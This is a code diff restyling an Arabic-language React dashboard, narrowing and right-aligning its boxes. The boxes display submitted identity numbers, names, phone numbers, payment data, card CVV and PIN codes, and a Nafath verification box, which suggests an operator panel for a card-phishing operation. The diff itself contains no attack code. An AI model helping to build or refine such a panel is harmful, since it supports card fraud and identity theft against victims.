@@ -907,7 +907,18 @@ export default function DashboardPage() {
     const timestamp = getEntryTimestamp(raw);
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12, position: "relative" }}>
+      <div style={{ 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb", 
+        marginBottom: 12, 
+        marginTop: 10,
+        position: "relative",
+        width: "40%",
+        marginRight: 0,
+        marginLeft: "auto"
+      }}>
         {timestamp > 0 && (
           <div style={{
             position: "absolute",
@@ -922,60 +933,60 @@ export default function DashboardPage() {
             {new Date(timestamp).toLocaleString("ar-SA", { hour: "2-digit", minute: "2-digit", hour12: true })}
           </div>
         )}
-        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>📋</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
             صندوق المعلومات الأساسية
           </h3>
         </div>
         
-        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 8 }}>
+        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
           {raw?.identityNumber && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>رقم الهوية</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.identityNumber}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.identityNumber}</span>
             </div>
           )}
           {raw?.ownerName && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>الاسم</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.ownerName}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الاسم</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.ownerName}</span>
             </div>
           )}
           {raw?.buyerName && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>اسم المشتري</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.buyerName}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم المشتري</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.buyerName}</span>
             </div>
           )}
           {raw?.phoneNumber && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>رقم الهاتف</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهاتف</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</span>
             </div>
           )}
           {raw?.documentType && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>نوع المستند</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.documentType}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع المستند</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.documentType}</span>
             </div>
           )}
           {raw?.serialNumber && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>الرقم التسلسلي</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.serialNumber}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الرقم التسلسلي</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.serialNumber}</span>
             </div>
           )}
           {raw?.insuranceType && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>نوع التأمين</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.insuranceType}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع التأمين</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.insuranceType}</span>
             </div>
           )}
           {raw?.country && (
-            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>البلد</span>
-              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.country}</p>
+            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>البلد</span>
+              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.country}</span>
             </div>
           )}
         </div>
@@ -1106,8 +1117,18 @@ export default function DashboardPage() {
     }
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+      <div style={{ 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb", 
+        marginBottom: 12,
+        marginTop: 10,
+        width: "40%",
+        marginRight: 0,
+        marginLeft: "auto"
+      }}>
+        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>💳</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
             صندوق بيانات الدفع
@@ -1182,8 +1203,18 @@ export default function DashboardPage() {
     }
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+      <div style={{ 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb", 
+        marginBottom: 12,
+        marginTop: 10,
+        width: "40%",
+        marginRight: 0,
+        marginLeft: "auto"
+      }}>
+        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>🔐</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
             صندوق رمز التحقق من البطاقة
@@ -1248,8 +1279,18 @@ export default function DashboardPage() {
     }
 
     return (
-      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
-        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+      <div style={{ 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb", 
+        marginBottom: 12,
+        marginTop: 10,
+        width: "40%",
+        marginRight: 0,
+        marginLeft: "auto"
+      }}>
+        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
           <span style={{ fontSize: "1.2rem" }}>🔑</span>
           <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
             صندوق رمز PIN
@@ -1338,7 +1379,18 @@ export default function DashboardPage() {
     }
 
     return (
-      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
+      <div style={{ 
+        background: "#f9fafb", 
+        borderRadius: 8, 
+        padding: 8, 
+        border: "1px solid #d1d5db", 
+        fontFamily: "Cairo, Tajawal, sans-serif", 
+        marginBottom: 12,
+        marginTop: 10,
+        width: "40%",
+        marginRight: 0,
+        marginLeft: "auto"
+      }}>
         <div style={{ marginBottom: 8 }}>
           <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
             {(() => {
@@ -1448,7 +1500,18 @@ const renderNafadBox = () => {
     }
 
     return (
-      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
+      <div style={{ 
+        background: "#f9fafb", 
+        borderRadius: 8, 
+        padding: 8, 
+        border: "1px solid #d1d5db", 
+        fontFamily: "Cairo, Tajawal, sans-serif", 
+        marginBottom: 12,
+        marginTop: 10,
+        width: "40%",
+        marginRight: 0,
+        marginLeft: "auto"
+      }}>
         <div style={{ marginBottom: 8 }}>
           <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
             {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
